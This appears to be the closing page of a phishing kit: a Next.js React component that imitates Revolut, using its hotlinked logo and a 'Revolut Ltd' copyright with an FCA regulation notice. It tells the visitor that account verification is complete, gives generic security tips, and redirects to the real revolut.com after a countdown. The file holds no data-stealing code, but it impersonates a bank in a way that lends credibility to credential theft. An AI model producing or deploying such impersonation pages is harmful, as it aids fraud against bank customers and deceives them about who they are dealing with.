"use client"
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function VerificationPage() {
    const [countdown, setCountdown] = useState(10);
    const router = useRouter();

    // Handle countdown and redirect
    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
            return () => clearTimeout(timer);
        } else {
            window.location.href = "https://www.revolut.com";
        }
    }, [countdown]);

    // Handle manual redirect
    const handleRedirect = () => {
        window.location.href = "https://www.revolut.com";
    };

    return (
        <div className="min-h-screen bg-white text-gray-800 flex flex-col">
            {/* Header */}
            <header className="w-full p-6 border-b border-gray-200">
                <div className="max-w-4xl mx-auto">
                    <img 
                        src="https://assets.revolut.com/assets/brand/Revolut-Black.svg" 
                        alt="Revolut Logo" 
                        className="h-8"
                    />
                </div>
            </header>

            {/* Main content */}
            <main className="flex-grow flex flex-col items-center justify-center p-6">
                <div className="max-w-2xl w-full bg-white rounded-xl shadow-lg p-8 mx-auto">
                    {/* Success icon */}
                    <div className="flex justify-center mb-6">
                        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                            </svg>
                        </div>
                    </div>

                    {/* Title and subtitle */}
                    <h1 className="text-2xl font-bold text-center mb-2">Verification Complete</h1>
                    <p className="text-gray-500 text-center mb-8">Thank you for verifying your account ownership</p>

                    {/* Explanation */}
                    <div className="mb-8">
                        <p className="mb-4">
                            At Revolut, we take the security of your account very seriously. The verification you just completed helps us ensure that only you have access to your financial information and protects your account from unauthorized access.
                        </p>
                        <p className="mb-4">
                            This additional security step was necessary to verify that you are the rightful owner of this account before making changes or accessing sensitive information.
                        </p>
                    </div>

                    {/* Security recommendations */}
                    <div className="bg-blue-50 rounded-lg p-6 mb-8">
                        <h2 className="font-semibold text-lg mb-4">How to keep your account secure:</h2>
                        <ul className="space-y-3">
                            <li className="flex items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-blue-500 mr-2 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                                </svg>
                                <span>Use a strong, unique password for your Revolut account</span>
                            </li>
                            <li className="flex items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-blue-500 mr-2 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                                </svg>
                                <span>Enable biometric authentication (fingerprint or face ID) in the Revolut app</span>
                            </li>
                            <li className="flex items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-blue-500 mr-2 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                                </svg>
                                <span>Keep your device's operating system and the Revolut app updated</span>
                            </li>
                            <li className="flex items-start">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-blue-500 mr-2 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                                </svg>
                                <span>Never share your account details, PIN, or verification codes with anyone</span>
                            </li>
                        </ul>
                    </div>

                    {/* Redirect button */}
                    <div className="flex justify-center">
                        <button 
                            onClick={handleRedirect}
                            className="bg-purple-600 hover:bg-purple-700 text-white px-8 py-3 rounded-full font-medium transition-colors duration-200 flex items-center"
                        >
                            Continue to Revolut
                            <span className="ml-2 bg-white bg-opacity-20 text-white text-sm py-1 px-2 rounded-full">
                                {countdown}s
                            </span>
                        </button>
                    </div>
                </div>
            </main>

            {/* Footer */}
            <footer className="w-full p-6 border-t border-gray-200 mt-8">
                <div className="max-w-4xl mx-auto text-center text-gray-500 text-sm">
                    <p>© {new Date().getFullYear()} Revolut Ltd. All rights reserved.</p>
                    <p className="mt-2">Revolut Ltd is authorized and regulated by the Financial Conduct Authority.</p>
                </div>
            </footer>
        </div>
    );
}
